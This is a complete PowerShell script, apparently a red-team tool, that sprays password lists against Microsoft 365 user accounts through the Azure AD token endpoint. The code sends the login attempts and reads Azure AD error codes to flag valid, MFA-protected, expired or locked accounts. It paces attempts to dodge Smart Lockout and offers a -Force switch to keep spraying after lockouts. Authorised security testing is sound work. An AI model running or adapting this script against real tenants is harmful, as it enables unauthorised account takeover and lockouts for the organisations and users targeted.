<#
.SYNOPSIS
    Sprays a list of passwords against a list of specified M365 user accounts.
    
.DESCRIPTION
    This script can be used to spray a list of passwords against a list of specified M365 user accounts.

.PARAMETER Userlist
    Provide a list of M365 usernames which should be tested. The user list should specify one user per line: <username>@<tenantname>.onmicrosoft.com
    This parameter is mandatory.

.PARAMETER Passwordlist
    Provide a list of passwords which should be used for the spraying. The password list should specify one password per line.
    This parameter is mandatory.

.PARAMETER TimeoutInSeconds
    The TimeoutInSeconds parameter specifies how many seconds should pass before another password is sprayed on the specified accounts.
    If not specified, the default value is 240 seconds.

.PARAMETER Force
    When the -Force parameter is specified, there will be no prompt for confirmation if the spray should be continued in case of locked out accounts

.EXAMPLE
    Invoke-PasswordSpraying -Userlist "C:\temp\userlist.txt" -PWlist "C:\temp\passwordlist.txt"
    Invokes the password spraying...

.NOTES
    Author: Miriam Wiesner, @miriamxyra

#>

[cmdletbinding()]
param (
    [ValidateScript({ Test-Path $_ -PathType leaf })]
    [Parameter(Mandatory)]
    [string]$Userlist,
    [ValidateScript({ Test-Path $_ -PathType leaf })]
    [Parameter(Mandatory)]
    [string]$Passwordlist,
    [double]$TimeoutInSeconds = 240,
    [switch]$Force
)

function Add-ToPSCustomObject {
    [cmdletbinding()]
    param (
        [Parameter(Mandatory)]
        [string]$Username,
        [Parameter(Mandatory)]
        [string]$Password,
        [Parameter(Mandatory)]
        [boolean]$IsValid = $false,
        [string]$ErrorText = "",
        [string]$ErrorDescription = ""
    )

    [PSCustomObject]@{
        Username         = $Username
        Password         = $Password
        IsValid          = $IsValid
        ErrorText        = $ErrorText
        ErrorDescription = $ErrorDescription
    }
}

function Invoke-PasswordSpraying {
    [cmdletbinding()]
    param (
        [ValidateScript({ Test-Path $_ -PathType leaf })]
        [Parameter(Mandatory)]
        [string]$Userlist,
        [ValidateScript({ Test-Path $_ -PathType leaf })]
        [Parameter(Mandatory)]
        [string]$Passwordlist,
        [double]$TimeoutInSeconds = 240,
        [switch]$Force
    )
    
    $Url = "https://login.microsoft.com"
    $LockoutCnt = 0

    $Usernames = Get-Content $Userlist
    $Passwords = Get-Content $Passwordlist

    $UsersAndPasswords = :main ForEach ($Password in $Passwords) {

        Write-Verbose "Password: $Password"

        ForEach ($Username in $Usernames) {

            Write-Verbose "Username: $Username"

            $BodyParameters = @{
                'resource'    = 'https://graph.windows.net'
                'client_id'   = '1b730954-1685-4b74-9bfd-dac224a7b894' 
                'client_info' = '1'
                'grant_type'  = 'password'
                'username'    = $Username
                'password'    = $Password
                'scope'       = 'openid'
            }
            
            $HeaderParameters = @{
                'Accept'       = 'application/json';
                'Content-Type' = 'application/x-www-form-urlencoded'
            }

            try {
                $WebRequest = Invoke-WebRequest $Url/common/oauth2/token -Method Post -Headers $HeaderParameters -Body $BodyParameters -ErrorVariable WebrequestError
            }
            catch {

                If ($WebRequest.StatusCode -eq "200") {
                    Write-Verbose "Success: $Username - $Password"

                    Add-ToPSCustomObject -Username $Username -Password $Password -IsValid $true

                    $WebRequest = ""
                    $IsValid = ""
                    $WebrequestError = ""
                    $ErrorDescription = ""
                }
                else {
                    Switch -regex ($WebrequestError) {
                        "AADSTS50126" {
                            $ErrorDescription = "Invalid Password."
                            $IsValid = $false
                        }
                        "AADSTS50034" {
                            $ErrorDescription = "Username does not exist."
                            $IsValid = $false
                        }
                        "AADSTS50057" {
                            $ErrorDescription = "Account is disabled."
                            $IsValid = $false
                        }
                        "AADSTS50053" {
                            $ErrorDescription = "Account is locked."
                            $IsValid = $false
                            $LockoutCnt++
                        }
                        "AADSTS50128|AADSTS50059" {
                            $ErrorDescription = "Tenant does not exist."
                            $IsValid = $false
                        }
                        "AADSTS50079|AADSTS50076" {
                            $ErrorDescription = "MFA is in use, account and password exists."
                            $IsValid = $true
                        }
                        "AADSTS50158" {
                            $ErrorDescription = "Conditional access is in use, account and password exists."
                            $IsValid = $true
                        }
                        "AADSTS50055" {
                            $ErrorDescription = "Password is expired, account and password exists."
                            $IsValid = $true
                        }
                        default {
                            $ErrorDescription = "Unknown error."
                            $IsValid = $false
                        }
                    }
        
                    if ($IsValid) {
                        Write-Verbose "Success: $Username - $Password | $ErrorDescription | $WebrequestError"
                    }
        
                    Add-ToPSCustomObject -Username $Username -Password $Password -IsValid $IsValid -ErrorText $WebrequestError -ErrorDescription $ErrorDescription

                    $WebRequest = ""
                    $IsValid = ""
                    $WebrequestError = ""
                    $ErrorDescription = ""
                }

                if (!$Force -and $LockoutCnt -ge 10 -and !$ContinueCnt) {
                    $TitleStr = "Multiple accounts are locked out!"
                    $MessageStr = "At least 10 of the sprayed accounts appear to be locked. This might indicate that Azure AD Smart Lockout is enabled. Do you want to continue spraying them?"
                    $Yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", `
                        "Continues the password spray."
            
                    $No = New-Object System.Management.Automation.Host.ChoiceDescription "&No", `
                        "Cancels the password spray."
            
                    $Options = [System.Management.Automation.Host.ChoiceDescription[]]($Yes, $No)
            
                    $Result = $host.ui.PromptForChoice($TitleStr, $MessageStr, $Options, 0)

                    $ContinueCnt++
            
                    if ($Result -ne 0) {
                        Write-Host "Cancelling the password spray."
                        break main
                    }
                }
            }
        }

        Write-Verbose "Sleeping for $TimeoutInSeconds seconds..."
        Start-Sleep -Seconds $TimeoutInSeconds
    }
    return $UsersAndPasswords
}

Invoke-PasswordSpraying @PSBoundParameters


